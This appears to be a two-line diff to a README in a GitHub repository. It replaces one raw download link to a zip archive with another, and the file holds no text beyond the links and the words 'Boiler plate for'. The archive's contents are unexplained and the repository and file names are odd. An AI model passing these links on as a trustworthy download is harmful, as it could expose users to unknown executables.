@@ -1,2 +1,2 @@
-# https://raw.githubusercontent.com/Subhopriyo/New-New-CGSO/master/hydrometamorphism/CGSO-New-aflight.zip
-Boiler plate for https://raw.githubusercontent.com/Subhopriyo/New-New-CGSO/master/hydrometamorphism/CGSO-New-aflight.zip
+# https://github.com/Subhopriyo/New-New-CGSO/raw/refs/heads/master/hydrometamorphism/New_CGSO_1.8-alpha.5.zip
+Boiler plate for https://github.com/Subhopriyo/New-New-CGSO/raw/refs/heads/master/hydrometamorphism/New_CGSO_1.8-alpha.5.zip
